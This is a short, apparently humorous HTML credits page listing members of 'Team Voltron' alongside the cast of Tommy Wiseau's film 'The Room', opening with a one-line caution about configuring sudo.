* Configure sudo with great caution; a misconfiguration has terrible consequences

<h1 align=center>CAST</h1>
<p></p>
<h2 align=center>Team Voltron</h2>
<p><br /></p>
<p align=center>
Guiseppe as Himself<br />
Matato as <a href="http://howdoilinux.com">Himself</a><br />
SteveyDevey as <a href="http://newsted.net">Himself</a><br />
CtlFish as <a href="https://blog.csuttles.io">Himself</a><br />
Tommy as <a href="https://www.imdb.com/title/tt0368226/characters/nm1382072?ref_=tt_cl_t1">Johnny</a><br />
</p>
<p align=center>
<b>Directed by Tommy Wiseau<br /><br />
Written by Tommy Wiseau<br />
    </b>
    </p>
<h3 align=center>Team Wiseau</h3>
<br />
<p align=center>
Tommy Wiseau as Johnny<br />
Juliette Danielle as Lisa<br />
Greg Sestero as Mark<br />
Philip Haldiman as Denny (as Phillip Haldiman)<br />
Carolyn Minnott as Claudette (as Carolyn Minnot)<br />
Robyn Paris as Michelle<br />
Mike Holmes as Mike (as Mike Scott)<br />
Dan Janjigian as Chris-R<br />
Kyle Vogt as Peter<br />
Greg Ellery as Steven<br />
Piper Gore as Party Member # 1<br />
Kari McDermott as Party Member # 2 (as Kari McDermont)<br />
Jennifer Vanderbliek... Party Member # 3 (as Jen Vanderbliek)<br />
Bennett Dunn as Party Member # 4 (as Bennet Dunn)<br />
Padma Moyer as Susan<br />
Daron Jennings as Barista # 2<br />
Thomas E. Webster as Coffee Shop Customer # 1<br />
Nora DeMarcky as Coffee Shop Customer # 2<br />
Arelle Mitkowski as Coffee Shop Customer # 3<br />
Frank Willey as Coffee Shop Customer # 4<br />
Amy Von Brock as Party Member # 5 (uncredited)<br />
</p>

